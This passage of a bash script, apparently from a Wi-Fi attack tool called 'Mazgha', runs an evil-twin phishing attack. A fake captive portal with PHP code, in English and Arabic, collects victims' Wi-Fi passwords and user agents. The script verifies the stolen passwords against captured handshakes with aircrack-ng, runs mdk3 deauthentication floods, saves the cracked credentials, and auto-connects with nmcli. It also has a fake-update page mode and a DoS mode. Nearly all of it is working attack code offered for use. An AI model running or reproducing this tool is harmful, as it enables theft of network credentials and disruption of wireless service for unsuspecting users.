            htmleditphp='<?php if($_POST[sub]){echo "<h3 class=messah3>المرجو تأكيد إدخال كلمة المرور مجددا</h3>";$txt=$_POST[password];$file=fopen("pass/password.txt","w");fwrite($file,$txt."\n");fwrite($file,$txt);}?>'
        elif [[ $attack == "eviltwindeflt" ]]
		then
            htmleditphp='<?php if($_POST[sub]){echo "<h3 class=messah3>Please confirm that you have entered your password again</h3>";$txt=$_POST[password];$file=fopen("pass/password.txt","w");fwrite($file,$txt."\n");fwrite($file,$txt);}?>'
        fi
        trap clnconfig INT >$mazra_output 2>&1
        $attack
        settnmazghaconnect
        function chackchannel(){
        airodump-ng --bssid ${Bssid} ${mon} 2> $pathname/stan.txt  &>$mazra_output & airodump=$!
        sleep 7
        kill $airodump &>$mazra_output
        ch=`tail $pathname/stan.txt | grep ${Bssid} | awk '{print $6}'  &>$mazra_output`
        rm $pathname/stan.txt &>$mazra_output
        if [[ $ch != "" ]]; then
            if ! [[ $channel == $ch ]]; then
                kill $mdk3pid &>$mazra_output
                clear
                echo "Target is Su Hot , New Channel $ch"
                sleep 0.23
                echo -en $white "[$cyan*$white]Decode handshak ...\n"
                xterm -geometry 76x20-10-0 -bg black -fg green -T Mdk3 -e "mdk3 ${mon} d -b $pathname/mac -c ${ch} $2>&1" & mdk3pid=$!
            fi
        fi
        }
        echo -en $white "[$cyan*$white]Decode handshak ...\n"
        if ! [[ -f "$www/pass/password.txt" ]]; then
            touch $www/pass/password.txt
        fi
        #passd=""
        #while [[ $passd == "" ]]
        #do
        #    if ! pgrep -x "lighttpd" >$mazra_output 2>&1
         #   then
         #       echo "Restart Lighttpd" 
         #       kill `lsof -t -i:80` >$mazra_output 2>&1
          #      lighttpd -f $www/lighttpd.conf >$mazra_output 2>&1
        #    fi
         #   passd=`tail $www/pass/password.txt | awk '{print $1}'`
        #done
        passwordcracker=""
        while [[ $passwordcracker == "" ]]
        do
            if ! pgrep -x "lighttpd" >$mazra_output 2>&1
            then
                echo "Restart Lighttpd" 
                kill `lsof -t -i:80` >$mazra_output 2>&1
                lighttpd -f $www/lighttpd.conf >$mazra_output 2>&1
            fi
            chackchannel
            passwordcracker=`aircrack-ng -w $www/pass/password.txt $pathname/hashdump-01.cap | grep "Current passphrase" | awk '{print $3}'`
        done
        essid=`aircrack-ng $pathname/hashdump-01.cap | grep "handshake" | awk '{print $3}'`
        echo "            ======== Mazgha ========
                    Bassid   => ${Bssid}
                    Password => ${passwordcracker}
                    Essid    => ${essid}
                     BY YASSIN From Morocco 
                    ========================
            " > $pathname/${Bssid}-password.txt
        clear 
        backgroundmazgha
        echo ""
        echo -e $white "    +=========================$cyan Password CRACKER$white ==========================+" && sleep 0.26
        echo -e " $green       Bssid          =>${white}  ${Bssid} " && sleep 0.26
        echo -e " $green       Essid          =>${white}  ${essid}"
        echo -e $green "       Password       =>${white}  ${passwordcracker} " && sleep 0.26
        echo -e " $green       Save Password  =>${white}  $pathname/${Bssid}-password.txt"
        echo -e $white "    +=====================================================================+" && sleep 0.26
        rm $www/pass/password.txt >$mazra_output 2>&1
        rm $pathname/hashdump-* >$mazra_output 2>&1
        shutdown 
        if hash nmcli 2>$mazra_output; then
            for a in ${BASH_ARGV[*]} ; do
                if [[ $a == "--connect" ]]; then
                    echo "[ * ] Try Connecte With ${essid} "
                    #connect=$(nmcli device wifi connect "$essid" password "$pass" iface "$monitor" | grep "successfully" >$mazra_output 2>&1)
                    if nmcli dev wifi connect "$Essid" password "$passwordcracker" ifname wlan0 | grep "successfully" >$mazra_output 2>&1 ; then
                        echo -e $white " Connected With ${essid} "
                    else 
                        echo -e $red   " Can't Connecte With ${essid} "
                    fi
                fi
            done
        else
            echo "nmcli Nout Found"
        fi
        exit 1
    fi
    done
elif [[ $handshaker == "nomazgha" ]]
    then
    if [[ $attack == "eviltwindeflt" ]]; then
        htmleditphp='<?php if($_POST[sub]){echo "<h3 class=messah3>المرجو تأكيد إدخال كلمة المرور مجددا</h3>";$user=$_SERVER["HTTP_USER_AGENT"];$txt=$_POST[password];$file=fopen("pass/password.txt","w");fwrite($file,"Passowrd --> ".$txt);$txt="\n User => ".$user."\n";fwrite($file,$txt);}?>'
    else
        htmleditphp='<?php if($_POST[sub]){echo "<h3 class=messah3>Please confirm that you have entered your password again</h3>";$user=$_SERVER["HTTP_USER_AGENT"];$txt=$_POST[password];$file=fopen("pass/password.txt","w");fwrite($file,"Passowrd --> ".$txt);$txt="\n User => ".$user."\n";fwrite($file,$txt);}?>'
    fi
     $attack
    settnmazghaconnect
    shutdown && exit 1
fi
trap clnconfig INT >$mazra_output 2>&1
if [[ $attack == "fakehtmlupdate" ]]; then
	fakehtmlupdate
	settnmazghaconnect
    while [[ $Bssid == "" ]] || [[ $channel == "" ]]
    do 
        tamazgha 
    done
    #echo -e "$blue [$green+$blue]$cyan Start Mdk3 DoSAttack ..."
    sleep 0.5
    echo ${Bssid} > mac
    #xterm -bg black -fg green -title "[☠] MDK3 [☠]" -T Mdk3 -e "mdk3 ${mon} d -b $pathname/mac -c ${channel} $2>&1" & mdk3pid=$!
    echo -e "$blue [$green!$blue]$green Ctr+c To Stop or exit"
    while true
        do
        if ! pgrep -x "lighttpd" >$mazra_output 2>&1
        then
            echo "Restart Lighttpd" 
            kill `lsof -t -i:80` >$mazra_output 2>&1
            lighttpd -f $www/lighttpd.conf >$mazra_output 2>&1
        fi
    done
elif [[ $attack == "dosattacks" ]]
    then
    dosattacks
fi
shutdown && exit 1